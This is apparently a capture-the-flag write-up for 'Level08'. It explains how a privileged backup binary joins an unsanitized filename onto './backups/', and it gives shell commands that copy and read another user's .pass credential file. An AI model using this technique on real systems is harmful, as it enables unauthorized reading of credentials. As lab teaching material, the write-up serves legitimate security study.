# Level08

Our goal is to read the .pass file from another user's home directory, even though we don’t have direct permission.

## Binary behavior
When decompiling the binary, we notice:
- It expects one argument: the name of a file to back up.
- It logs the start and end of the backup using a custom function `log_wrapper()`.

It :
- Opens a log file at ./backups/.log.
- Logs the start of the backup.
- Opens the file given in argument.
- Prepares the destination path as ./backups/<filename>.
- Copies the content byte by byte.
- Logs the end of the backup.

The destination path is built like this:
```
strncpy(local_78, "./backups/", 11);
strncat(local_78, filename, ...);
```

So if we pass a filename like:
```
home/users/level09/.pass
```
The final path becomes:
```
./backups/home/users/level09/.pass
```

The program will then open this file, copy its content, and write it into that path under ./backups/.

## Exploitation
The vulnerability here is that the user input (`filename`) is concatenated directly to the backup path without any sanitization. This allows us to inject subdirectories and filenames.

To exploit it:
```
cd /tmp
mkdir -p ./backups/home/users/level09/
~/level08 home/users/level09/.pass
cat /tmp/backups/home/users/level09/.pass
```
The program copies the target file into our own directory. We can now read the content.